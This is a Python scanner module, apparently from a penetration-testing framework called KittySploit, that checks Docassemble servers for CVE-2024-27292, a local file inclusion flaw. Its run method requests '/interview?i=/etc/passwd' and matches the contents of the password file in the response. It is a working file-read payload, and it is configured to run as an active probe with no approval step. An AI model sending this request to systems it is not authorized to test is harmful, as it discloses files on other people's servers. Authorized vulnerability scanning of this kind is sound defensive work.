#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Docassemble is an expert system for guided interviews and document assembly."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Docassemble - Local File Inclusion Detection',
        'description': 'Docassemble is an expert system for guided interviews and document assembly. The vulnerability allows attackers to gain unauthorized access to information on the system through URL manipulation. It affects versions 1.4.53 to 1.4.96. The vulnerability has been patched in version 1.4.97 of the master branch.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'docassemble', 'lfi', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://tantosec.com/blog/docassemble/',
            'https://github.com/jhpyle/docassemble/security/advisories/GHSA-jq57-3w7p-vwvv',
            'https://github.com/jhpyle/docassemble/commit/97f77dc486a26a22ba804765bfd7058aabd600c9',
        ],
        'cve': 'CVE-2024-27292',
    }

    def run(self):
        r = self.http_request(method="GET", path='/interview?i=/etc/passwd', allow_redirects=False)
        if not r or r.status_code != 501:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Docassemble - Local File Inclusion detected",
                path='/interview?i=/etc/passwd',
            )
            return True
        return False

